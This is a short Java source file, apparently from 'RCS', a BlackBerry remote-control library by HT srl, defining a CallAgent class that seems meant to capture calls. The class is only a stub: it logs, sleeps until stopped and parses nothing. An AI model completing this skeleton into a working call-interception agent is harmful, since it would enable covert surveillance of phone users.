/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : CallAgent.java 
 * Created      : 26-mar-2010
 * *************************************************/
package com.ht.rcs.blackberry.agent;

import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

public class CallAgent extends Agent {
	//#debug
    private static Debug debug = new Debug("CallAgent", DebugLevel.VERBOSE);

    public CallAgent(boolean agentStatus) {
        super(Agent.AGENT_CALL, agentStatus, true);
    }

    protected CallAgent(boolean agentStatus, byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    public void actualRun() {
        // #debug
        debug.trace("run");

        this.sleepUntilStopped();
    }

    protected boolean parse(byte[] confParameters) {
        // TODO Auto-generated method stub
        return false;
    }

}
